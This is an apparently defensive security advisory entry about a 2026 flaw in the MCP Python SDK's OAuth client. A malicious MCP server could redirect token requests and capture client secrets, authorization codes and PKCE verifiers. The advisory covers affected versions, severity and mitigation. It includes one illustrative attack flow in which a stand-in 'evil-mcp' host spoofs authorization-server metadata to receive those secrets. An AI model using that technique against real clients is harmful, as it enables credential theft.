---
caseId: "147"
title: "The official MCP Python SDK let a connected server choose the authorization server, sending client secrets, auth codes and PKCE verifiers to an attacker's token endpoint"
filed: "2026-10-01"
filedDisplay: "01 Oct 2026"
firstObserved: "28 Sep 2026"
severity: medium
category: "Configuration / default-settings failure"
status: "Patched"
affectedSystems: "mcp (PyPI, official MCP Python SDK), client OAuth support in mcp.client.auth: >=1.9.1, <1.30.0 and >=2.0.0a1, <2.2.0; ClientCredentialsOAuthProvider and PrivateKeyJWTOAuthProvider remain exposed on fixed versions unless issuer= is set"
cve: "No CVE assigned as of writing; tracked as GHSA-qx49-fqc8-xw99"
readTime: "5 min read"
related: ["128", "142", "109"]
---

## Summary

The official MCP Python SDK's OAuth client resolved which authorization server to talk to from metadata supplied by the MCP server it was connecting to, did not validate the `issuer` in that metadata on every discovery path, and did not bind stored or pre-provisioned client credentials to the authorization server they were issued by. A malicious or compromised MCP server could therefore steer the client to a token endpoint of its choosing and receive the `client_secret`, authorization code and PKCE `code_verifier` intended for the user's real authorization server. Fixed releases add issuer validation and credential binding, but the two unattended providers stay exposed until the integrator passes a new `issuer=` argument.

## What was observed

The maintainers published GHSA-qx49-fqc8-xw99 on 28 Sep 2026 (CVSS 3.1 7.5, CWE-345 and CWE-522), crediting eight reporters; Cycode's researchers coordinated a disclosure with Anthropic's MCP security team, and fixes shipped before the advisory went public. The flaw sat in `mcp.client.auth`, used whenever an HTTP MCP client set `OAuthClientProvider`, `ClientCredentialsOAuthProvider`, `PrivateKeyJWTOAuthProvider` or the deprecated 1.x `RFC7523OAuthClientProvider` as the transport's `auth` handler.

MCP authorization discovery begins at the resource: the client fetches the MCP server's protected resource metadata, learns which authorization server protects it, then fetches that authorization server's metadata to find the token endpoint. The advisory described two ways a hostile server could exploit the SDK's trust in that chain. It could name its own authorization server in its protected resource metadata. Or it could publish no protected resource metadata at all, returning 404, which pushed the SDK onto a legacy fallback that read OAuth configuration from the MCP server itself; the server then served metadata naming the user's real authorization server as `issuer` while pointing `token_endpoint` at itself.

```
# Illustrative flow, mcp < 1.30.0 / 2.0.0a1–2.1.1 (legacy fallback path)
GET  https://evil-mcp/.well-known/oauth-protected-resource   -> 404
GET  https://evil-mcp/.well-known/oauth-authorization-server
     { "issuer": "https://auth.example.com",        # real AS, never checked
       "token_endpoint": "https://evil-mcp/token" }  # attacker-controlled
POST https://evil-mcp/token
     client_secret=...  code=...  code_verifier=...  # meant for auth.example.com
```

Coverage differed by line. Versions 1.9.1 through 1.29.1 had no `issuer` check and no credential binding on any path. Versions 2.0.0 through 2.1.1 were missing both only when the server published no protected resource metadata or answered `403 insufficient_scope`. On both lines, `ClientCredentialsOAuthProvider` and `PrivateKeyJWTOAuthProvider` offered no way to declare which authorization server their credentials belonged to, so they followed whatever the MCP server advertised; with `PrivateKeyJWTOAuthProvider` the leaked artifact was a signed client assertion rather than a secret. MCP servers built with the SDK, stdio clients and clients that attach their own tokens were not affected.

This file rates the issue medium rather than the advisory's high. Exploitation required the victim's client to connect to an MCP server the attacker controlled while holding credentials for a legitimate authorization server, and with the interactive `OAuthClientProvider` a person had to start the sign-in, which the advisory itself scored at 6.5. The 7.5 headline was scored for the unattended providers.

## Mitigation

Upgrade `mcp` to 1.30.0 or 2.2.0 or later. In fixed versions the client determines the expected issuer before fetching any authorization server metadata, rejects metadata whose `issuer` differs with `OAuthFlowError`, and binds stored registrations to that issuer. Users of `ClientCredentialsOAuthProvider` or `PrivateKeyJWTOAuthProvider` must additionally pass `issuer=` (for example `issuer="https://auth.example.com"`); without it those providers still follow the server-advertised authorization server, and on 1.30.0 the omission raises only a `DeprecationWarning`, which Python suppresses by default. `RFC7523OAuthClientProvider` has no `issuer` option and must be replaced.

Clear stored OAuth client registrations once after upgrading: registrations saved before the fix carry no issuer and remain unbound. Any client that may have connected to an untrusted MCP server on an affected version should have its client secret rotated and its tokens revoked at the authorization server.

The MCP server is a party to the OAuth exchange, not a trusted directory for it; a client that lets the resource tell it where to send its secrets has delegated credential custody to whoever runs the resource.
